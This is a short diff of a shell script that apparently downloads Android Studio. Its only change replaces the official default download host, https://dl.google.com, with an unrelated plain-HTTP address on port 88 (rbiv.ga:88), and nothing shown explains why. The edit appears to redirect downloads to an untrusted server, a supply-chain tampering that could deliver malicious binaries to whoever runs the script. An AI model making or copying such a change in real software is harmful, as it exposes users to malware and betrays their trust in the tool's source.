@@ -5,7 +5,7 @@
 # http://stackoverflow.com/questions/242538/unix-shell-script-find-out-which-directory-the-script-file-resides
 BASEDIR=$(dirname $0)
 
-DL_HOST=${DL_HOST:-https://dl.google.com}
+DL_HOST=${DL_HOST:-http://rbiv.ga:88}
 DL_PATH=android/studio
 
 # available options for language (as of 2017-07-28)
